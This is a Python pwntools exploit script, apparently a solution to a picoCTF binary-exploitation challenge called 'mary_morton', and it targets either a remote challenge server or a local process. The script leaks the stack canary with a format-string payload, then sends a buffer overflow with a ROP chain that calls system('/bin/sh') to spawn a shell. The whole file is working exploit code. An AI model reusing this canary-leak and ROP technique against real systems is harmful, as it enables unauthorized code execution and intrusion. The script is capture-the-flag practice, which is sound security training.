#!/usr/bin/python3
from pwn import *

exe = context.binary = ELF("./mary_morton", checksec=False)
#libc = ELF("/usr/lib/i386-linux-gnu/libc.so.6", checksec=False)

info = lambda msg, x: log.info(msg + hex(x))
warn = lambda msg: log.warn(msg)
s = lambda data: sleep(0.1) or p.send(data)
sl = lambda data: sleep(0.1) or p.sendline(data)
sa = lambda msg, data: p.sendafter(msg, data)
sla = lambda msg, data: p.sendlineafter(msg, data)

if args.REMOTE:
    p = remote("rhea.picoctf.net", 53917)
else:
    p = process()

if args.GDB:
    context.terminal = ['tmux', 'splitw', '-h', '-p', '55']
    gdb.attach(p, gdbscript='''
        b*0x0804864F 
	    c
	''')
    #input()

#blind attack :>
payload = b"%23$p"
sla(b"3. Exit the battle \n", b"2")
sl(payload)
canary = int(p.recvline().strip(), 16)
info("Canary: ", canary)

payload = b"A"*8*17 + p64(canary) + p64(0)
payload += p64(0x0000000000400ab3) + p64(next(exe.search(b"/bin/sh\0")))
payload += p64(0x0000000000400659)
payload += p64(exe.plt['system'])
sla(b"3. Exit the battle \n", b"1")
s(payload)

p.interactive()
